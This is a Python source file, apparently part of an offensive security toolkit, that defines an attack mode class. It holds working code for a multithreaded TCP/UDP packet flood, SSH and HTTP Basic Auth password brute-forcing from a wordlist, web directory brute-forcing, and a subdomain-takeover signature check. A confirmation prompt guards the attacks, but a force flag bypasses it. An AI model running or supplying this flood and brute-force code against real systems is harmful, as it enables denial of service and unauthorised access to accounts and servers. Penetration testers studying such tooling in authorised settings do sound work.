import socket
import threading
import time
import os
import random
import requests
from ..utils.logger import get_logger
from ..utils.config import get_config

try:
    import paramiko
except ImportError:
    paramiko = None

logger = get_logger()
config = get_config()

class AttackMode:
    def __init__(self, args):
        self.args = args

    def run(self):
        if getattr(self.args, 'flood', False):
            self.start_flood()
        elif getattr(self.args, 'bruteforce', None):
            self.start_brute()
        elif getattr(self.args, 'dirbrute', False):
             self.start_dirbrute()
        elif getattr(self.args, 'takeover', False):
             self.subdomain_takeover()
        else:
             logger.info("Attack mode. Use --help for usage.")

    def _confirm(self, action):
        """Mandatory safety confirmation for destructive actions."""
        if getattr(self.args, 'force', False):
            return True
        logger.warning(f"ACTION REQUIRED: Confirm starting {action} on {self.args.target}?")
        choice = input("[y/N]: ").lower()
        return choice == 'y'

    def start_flood(self):
        target = getattr(self.args, 'target', None)
        port = getattr(self.args, 'port', 80)
        protocol = getattr(self.args, 'protocol', 'tcp').lower()
        duration = getattr(self.args, 'duration', 10)
        
        if not self._confirm(f"{protocol.upper()} flood"):
            logger.info("Flood cancelled.")
            return
            
        logger.info(f"Starting {protocol.upper()} flood on {target}:{port} for {duration}s...")
        
        stop_time = time.time() + duration
        packets_sent = 0
        thread_count = config.get('threads', 20)
        
        def flood_worker():
            nonlocal packets_sent
            while time.time() < stop_time:
                try:
                    if protocol == 'tcp':
                        # Use high-performance connection attempt for flooding
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.5)
                        s.connect((target, port))
                        s.send(random._urandom(1024))
                        s.close()
                    else: # UDP
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.sendto(random._urandom(1024), (target, port))
                    packets_sent += 1
                except:
                    pass

        threads = []
        for _ in range(thread_count):
             t = threading.Thread(target=flood_worker)
             t.start()
             threads.append(t)
             
        # Real-time stats display
        start_time = time.time()
        while time.time() < stop_time:
            time.sleep(1)
            elapsed = time.time() - start_time
            pps = packets_sent / elapsed if elapsed > 0 else 0
            logger.info(f"Stats: Sent: {packets_sent} | Rate: {pps:.2f} PPS | Time: {elapsed:.1f}/{duration}s")
             
        for t in threads:
            t.join()
            
        logger.success(f"Flood attack on {target} finished. Total packets: {packets_sent}")

    def start_brute(self):
        service = self.args.bruteforce.lower()
        target = self.args.target
        user = getattr(self.args, 'user', 'root')
        wordlist = getattr(self.args, 'wordlist', None)
        
        if not wordlist or not os.path.exists(wordlist):
            logger.error(f"Wordlist {wordlist} not found.")
            return

        if not self._confirm(f"{service.upper()} brute-force"):
            return

        if service == 'ssh':
            self._ssh_brute(target, user, wordlist)
        elif service == 'http':
            self._http_brute(target, user, wordlist)

    def _ssh_brute(self, target, user, wordlist):
        if not paramiko:
            logger.error("paramiko is not installed. 'pip install paramiko'.")
            return
            
        logger.info(f"Bruteforcing SSH: {user}@{target}")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        with open(wordlist, 'r') as f:
            for line in f:
                password = line.strip()
                if not password: continue
                logger.brute(f"Trying: {user}:{password}")
                try:
                    ssh.connect(target, port=22, username=user, password=password, timeout=1.5)
                    logger.success(f"CRACKED: {user}:{password}")
                    ssh.close()
                    return
                except:
                    continue
        logger.warning("End of list. No match found.")

    def _http_brute(self, target, user, wordlist):
        logger.info(f"Bruteforcing HTTP Basic Auth: {user}@{target}")
        if not target.startswith('http'):
             target = f"http://{target}"
             
        with open(wordlist, 'r') as f:
            for line in f:
                password = line.strip()
                if not password: continue
                logger.brute(f"Trying: {user}:{password}")
                try:
                    response = requests.get(target, auth=(user, password), timeout=1.5)
                    if response.status_code == 200:
                        logger.success(f"CRACKED: {user}:{password}")
                        return
                    elif response.status_code == 401:
                        continue
                except:
                    continue
        logger.warning("End of list. No match found.")

    def start_dirbrute(self):
        target = self.args.target
        wordlist = getattr(self.args, 'wordlist', None)
        
        if not wordlist or not os.path.exists(wordlist):
            logger.error("Wordlist not found.")
            return

        if not target.startswith('http'):
             target = f"http://{target}"
        if not target.endswith('/'):
             target += '/'
             
        logger.info(f"Starting directory brute-force on {target}")
        
        with open(wordlist, 'r') as f:
            for line in f:
                path = line.strip()
                if not path: continue
                url = f"{target}{path}"
                logger.brute(f"Checking: {url}")
                try:
                    response = requests.get(url, timeout=1.5)
                    if response.status_code == 200:
                        logger.success(f"FOUND: {url} (200 OK)")
                    elif response.status_code in [301, 302]:
                        logger.success(f"REDIRECT: {url} ({response.status_code})")
                except requests.RequestException:
                    continue

    def subdomain_takeover(self):
        target = self.args.target
        # Enhanced signatures for common vulnerable services
        takeover_signatures = {
            "NoSuchBucket": "AWS S3 Bucket Takeover",
            "nosuchbucket": "AWS S3 Bucket Takeover",
            "herokucdn.com": "Heroku Takeover",
            "github.io": "GitHub Pages Takeover",
            "404 Not Found": "General 404 (Manual Check Required)",
            "Repository not found": "GitHub Repository Takeover"
        }
        
        logger.info(f"Searching for takeover signatures on {target}...")
        try:
            response = requests.get(f"http://{target}", timeout=5)
            content = response.text
            for sig, name in takeover_signatures.items():
                if sig in content:
                    logger.success(f"POTENTIAL {name} DETECTED! Content matched: '{sig}'")
                    return
            logger.info(f"No obvious takeover signatures detected on {target}")
        except Exception as e:
             logger.error(f"Connect failed to {target}: {e}")
